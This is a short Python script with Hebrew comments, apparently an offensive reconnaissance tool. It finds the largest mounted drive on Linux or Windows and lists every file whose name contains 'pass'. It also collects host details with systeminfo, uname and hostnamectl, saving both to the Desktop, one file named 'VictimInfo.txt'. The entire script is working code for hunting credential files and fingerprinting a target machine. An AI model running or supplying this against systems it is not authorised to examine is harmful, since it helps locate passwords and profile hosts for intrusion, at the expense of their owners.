import os
import platform
import shutil


# בדיקת מספר הכוננים
def list_mount_points():
    mount_points = []
    if platform.system() == "Linux":
        # איסוף נקודות עגינה בלינוקס
        mount_points = [line.split()[2] for line in os.popen("mount -l").read().splitlines() if "ext4" in line or "xfs" in line]
    elif platform.system() == "Windows":
        # איסוף נקודות עגינה ב-Windows
        mount_points = os.popen("wmic logicaldisk get name").read().split()[1:]
    return mount_points


# חיפוש הכונן עם הכי הרבה נתונים וקבצים המכילים את המילה 'pass'
def find_largest_drive(drives):
    max_size = 0
    largest_drive = None
    for drive in drives:
        try:
            usage = shutil.disk_usage(drive)
            if usage.total > max_size:
                largest_drive = drive
                max_size = usage.total
        except Exception as e:
            print(f"Error with drive {drive}: {e}")
    return largest_drive


def find_files_with_pass(drive):
    results = []
    for root, dirs, files in os.walk(drive):
        for file in files:
            if "pass" in file:
                results.append(os.path.join(root, file))
    return results


# איסוף מידע על המערכת
def collect_and_write_system_info():
    system_info = ""
    file_name = "VictimInfo.txt"  # שם הקובץ זהה לשתי המערכות לצורך פשטות
    if platform.system() == "Windows":
        system_info = os.popen("systeminfo").read()
    elif platform.system() == "Linux":
        commands = ["uname -a", "lsb_release -a", "hostnamectl"]
        system_info = "\n".join([os.popen(cmd).read() for cmd in commands])
    write_to_file(file_name, system_info)


# כתיבת התוצאות לקבצים
def write_to_file(file_name, content):
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    file_path = os.path.join(desktop_path, file_name)
    with open(file_path, "w") as file:
        file.write(content)


if __name__ == "__main__":
    mount_points = list_mount_points()
    largest_drive = find_largest_drive(mount_points)
    if largest_drive:
        results = find_files_with_pass(largest_drive)
        write_to_file("result.txt", "\n".join(results))
        print("Results written to result.txt on Desktop.")
    else:
        print("Could not determine the largest drive.")
    collect_and_write_system_info()
    print("System information written to VictimInfo.txt on Desktop.")

